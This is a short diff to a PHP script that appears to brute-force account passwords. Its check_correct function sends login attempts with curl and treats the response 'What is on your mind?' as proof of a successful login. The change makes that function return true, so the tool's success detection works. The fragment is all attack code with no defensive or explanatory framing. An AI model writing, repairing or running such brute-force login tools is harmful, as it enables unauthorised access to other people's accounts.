@@ -36,7 +36,7 @@ function check_correct($Pass)
         $str = curl_exec($c); // Get it
         curl_close($c); 
 	if($str != "What is on your mind?") {return false;}
-        else {return ;}
+        else {return true;}
 }
 bruteForce($Pass);
 echo "NO PASSWORD FOUND"; 
